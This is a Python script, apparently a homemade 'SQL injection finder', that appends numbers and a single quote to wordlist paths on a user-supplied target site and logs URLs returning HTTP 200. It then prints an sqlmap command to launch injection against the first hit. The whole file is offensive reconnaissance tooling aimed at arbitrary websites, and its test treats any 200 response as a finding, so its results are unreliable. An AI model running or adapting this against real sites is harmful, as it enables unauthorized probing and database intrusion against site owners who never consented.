from colorama import Fore
import colorama
import requests

colorama.init()


print(Fore.BLUE+"""
     _______.  ______      __       __   _______ 
    /       | /  __  \    |  |     |  | |   ____|
   |   (----`|  |  |  |   |  |     |  | |  |__   
    \   \    |  |  |  |   |  |     |  | |   __|  
.----)   |   |  `--'  '--.|  `----.|  | |  |     
|_______/     \_____\_____\_______||__| |__|     

SQL INJECTION FINDER TOOL BY FAZZ, Whtrue | VERSION 0.1

""")

print("Example Url : https://www.fazztech.net/, https://fazztech.net/")

www = input("Target Url : ")

r = requests.get(www)

if r.status_code == 200 or r.status_code == "200":
    print(f"Try Connection : {www}, {r.status_code}, Connection succesfuly! ")
else:
    print(f"Try Connection : {www}, {r.status_code}, Connection failed! ")

URLS = []

with open("wordlist.txt","r",encoding="utf-8") as file:
    dork = file.readlines()

    new_lines = []
    for line in dork:
        line = line.strip()
        if line.startswith(".") or line.startswith("/"):
            line = line[1:]
        new_lines.append(line)

    for i in new_lines:
        i = i.strip()
        target = www+i
        URLS.append(target)

    COUNT = 0

    CONTROL = False

    while COUNT <= 7:

        for i in URLS:

            v = f"{i}{COUNT}'" 

            r = requests.get(v)

            print("\n")

            if r.status_code == 200 or r.status_code == "200":
                print(Fore.GREEN+v, f" Connection Succesfuly! I write Output!")

                CONTROL = True

                with open("output.txt", "a", encoding="utf-8") as file:
                    file.write(f"""{v}       
""")
            else:
                print(Fore.RED+v, f" No Connection.")

        COUNT+=1

    if CONTROL == True:
        with open("output.txt", "r", encoding="utf-8") as file:
                    v = file.readlines(1)

        print("\n")

        print(Fore.GREEN+"I finish my job!, Please Start SqlMap and Start Sql Injection.")
        
        print(f"""
        
        python sqlmap.py -u "{v[0]}" --batch --banner
        
        """)